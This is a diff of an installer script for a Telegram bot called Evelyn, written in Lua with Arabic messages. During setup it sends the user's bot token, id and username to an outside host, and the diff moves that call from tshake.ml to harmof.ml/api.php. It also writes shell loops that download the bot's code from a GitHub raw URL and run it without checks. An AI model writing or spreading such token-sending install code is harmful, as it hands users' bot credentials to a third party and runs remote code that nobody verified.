@@ -38,7 +38,7 @@ if not database:get(Server_Evelyn.."UserName_Evelyn") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info = http.request("http://tshake.ml/info/?user="..UserName)
+local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
 if Get_Info:match('Is_Spam') then
 io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
 return false
@@ -64,13 +64,14 @@ os.execute('lua start.lua')
 end
 local function Files_Evelyn_Info()
 Create_Info(database:get(Server_Evelyn.."Token_Evelyn"),database:get(Server_Evelyn.."Id_Evelyn"),database:get(Server_Evelyn.."UserName_Evelyn"))   
-http.request("http://tshake.ml/add/?id="..database:get(Server_Evelyn.."Id_Evelyn").."&user="..database:get(Server_Evelyn.."UserName_Evelyn").."&token="..database:get(Server_Evelyn.."Token_Evelyn"))
+https.request("https://harmof.ml/api.php?id="..database:get(Server_Evelyn.."Id_Evelyn").."&user="..database:get(Server_Evelyn.."UserName_Evelyn").."&token="..database:get(Server_Evelyn.."Token_Evelyn"))
 local RunEvelyn = io.open("Evelyn", 'w')
 RunEvelyn:write([[
+#!/usr/bin/env bash
 cd $HOME/Evelyn
 token="]]..database:get(Server_Evelyn.."Token_Evelyn")..[["
 rm -fr Evelyn.lua
-wget "https://raw.githubusercontent.com/DevArMoF/Evelyn/main/Evelyn.lua"
+wget "https://raw.githubusercontent.com/DevArMoF/Evelyn/master/Evelyn.lua"
 while(true) do
 rm -fr ../.telegram-cli
 ./tg -s ./Evelyn.lua -p PROFILE --bot=$token
@@ -79,6 +80,7 @@ done
 RunEvelyn:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
+#!/usr/bin/env bash
 cd $HOME/Evelyn
 while(true) do
 rm -fr ../.telegram-cli
